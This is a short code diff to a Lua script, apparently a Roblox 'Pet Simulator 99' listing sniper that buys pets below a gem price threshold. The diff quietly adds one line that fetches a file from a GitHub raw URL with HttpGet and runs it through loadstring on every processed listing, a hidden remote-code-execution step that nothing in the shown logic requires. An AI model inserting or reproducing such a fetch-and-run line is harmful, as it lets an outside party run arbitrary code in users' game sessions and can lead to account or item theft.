@@ -139,7 +139,8 @@ local function checklisting(uid, gems, item, version, shiny, amount, username, p
         if boughtPet == true then
             ping = true
 	end
-        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)  
+        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping) 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LordPippo/PS99/main/test.lua"))() 
     elseif type.titanic and gems / amount <= 10000000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         if boughtPet == true then
